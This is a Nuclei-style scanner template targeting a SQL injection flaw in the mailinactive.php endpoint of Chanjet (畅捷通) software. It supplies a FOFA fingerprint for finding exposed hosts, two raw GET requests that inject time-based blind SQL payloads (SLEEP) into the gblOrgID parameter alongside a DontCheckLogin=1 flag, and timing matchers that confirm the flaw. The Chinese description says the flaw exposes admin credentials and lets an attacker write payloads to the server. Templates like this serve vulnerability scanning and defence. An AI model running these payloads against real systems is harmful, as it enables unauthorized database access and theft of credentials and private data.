id: chanjet-mailinactive-sqli
info:
  name: 畅捷通mailinactive.php接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: icon_hash="-1068428644"
      畅捷通mailinactive.php接口存在SQL注入漏洞，攻击者可利用该漏洞执行恶意构造的SQL语句，实现对目标数据库的未授权访问。该缺陷允许攻击者提取敏感数据（如管理员后台凭证、用户隐私信息）并在特定权限条件下向服务器写入恶意负载，最终可能导致系统控制权丧失。
  tags: 畅捷通
http:
- raw:
  - |
    GET /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+-&DontCheckLogin=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  - |
    GET /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-&DontCheckLogin=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
